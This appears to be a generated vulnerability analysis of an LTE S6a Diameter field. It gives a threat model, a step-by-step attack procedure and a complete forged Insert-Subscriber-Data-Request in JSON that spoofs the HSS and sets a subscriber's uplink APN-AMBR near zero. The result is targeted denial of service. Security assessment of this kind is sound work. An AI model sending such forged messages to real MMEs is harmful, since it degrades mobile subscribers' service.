@@ -1,0 +1,99 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is an **MME** exposing its **S6a Diameter** service. An Internet attacker impersonates the **HSS** and sends a forged **Insert-Subscriber-Data-Request (IDR)** to that MME. The target field is `Subscription-Data.APN-Configuration-Profile.APN-Configuration.AMBR.Max-Requested-Bandwidth-UL`, i.e., the uplink component of APN-AMBR inside a subscriber's APN profile.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the MME, send syntactically valid forged **Requests**, and receive the corresponding **Answers**. The attacker does not observe or alter real HSS-MME traffic and has no extra NAS/GTP/radio capabilities. If subscriber targeting is needed, the attacker is assumed to know the subscriber identity and enough APN-profile context to identify the intended `APN-Configuration` instance.
+
+### **Exploitability Analysis:**
+`Max-Requested-Bandwidth-UL` is **field-specifically exploitable** under this threat model because it is not mere metadata: it is authoritative **subscriber provisioning input** inside IDR, and the MME uses it to update stored APN subscription state for a specific subscriber and APN configuration.
+
+The causal chain is concrete. A forged IDR from the spoofed HSS carries `Subscription-Data` with an `APN-Configuration-Profile`, a chosen `APN-Configuration` instance, and an `AMBR` group containing a malicious `Max-Requested-Bandwidth-UL` value. If accepted, the MME stores that value in the subscriber's APN profile cache as the uplink APN-AMBR for that APN. This is per-subscriber and per-APN state, not just per-transaction metadata.
+
+Changing this field specifically changes the uplink aggregate bandwidth limit associated with that APN. A very low value can cause severe uplink service degradation or effective denial of service for traffic using that APN once the updated subscription data is applied in later PDN/bearer handling. A very high value can also alter policy/QoS treatment if downstream EPC behavior honors the modified profile. The key point is that the negative outcome is driven by this field's value itself: it changes the rate limit parameter the MME later uses or propagates, rather than merely triggering generic IDR processing.
+
+The effect may not always be instant for already-active sessions, but that does not defeat exploitability. The evidence shows the field is stored and later reused for PDN connectivity/bearer handling, so the attacker can poison subscriber state that will affect subsequent or refreshed EPC procedures without needing additional non-Diameter capabilities.
+
+This is therefore not merely "the forged IDR is bad anyway." The incremental harm here is that this particular field lets the attacker set a concrete APN-level uplink QoS limit and thereby induce targeted subscriber service degradation.
+
+### **Attack Procedure:**
+Craft a forged **Insert-Subscriber-Data-Request** from the attacker-controlled Diameter connection to the MME, using the target subscriber identity and a coherent `Subscription-Data` payload. Inside `APN-Configuration-Profile`, include the intended `APN-Configuration` identified by `Context-Identifier` and `Service-Selection`, then include `AMBR` with a maliciously low `Max-Requested-Bandwidth-UL` and a matching `Max-Requested-Bandwidth-DL` for semantic coherence.
+
+A practical malicious setting is an extremely low uplink value, causing the subscriber's APN profile to be updated with a near-zero uplink APN-AMBR. Success is indicated by a successful IDA/answer from the MME and subsequent subscriber behavior showing reduced or unusable uplink throughput on the affected APN during later or refreshed PDN/bearer handling.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "flags": ["R", "P"],
+    "hop_by_hop_id": "0x10000001",
+    "end_to_end_id": "0x20000001"
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "value": "fakehss.example.net;1729000001;1;imsi-001010123456789"
+    },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    {
+      "name": "Auth-Session-State",
+      "value": 1
+    },
+    {
+      "name": "Origin-Host",
+      "value": "hss.fake.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "value": "fake.example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "value": "mme01.example.net"
+    },
+    {
+      "name": "Destination-Realm",
+      "value": "example.net"
+    },
+    {
+      "name": "User-Name",
+      "value": "001010123456789"
+    },
+    {
+      "name": "IDR-Flags",
+      "value": 0
+    },
+    {
+      "name": "Subscription-Data",
+      "value": {
+        "APN-Configuration-Profile": {
+          "Context-Identifier": 1,
+          "All-APN-Configurations-Included-Indicator": 0,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "PDN-Type": 0,
+              "Service-Selection": "internet",
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1,
+                "Max-Requested-Bandwidth-DL": 1000000
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+EXPLOITABLE
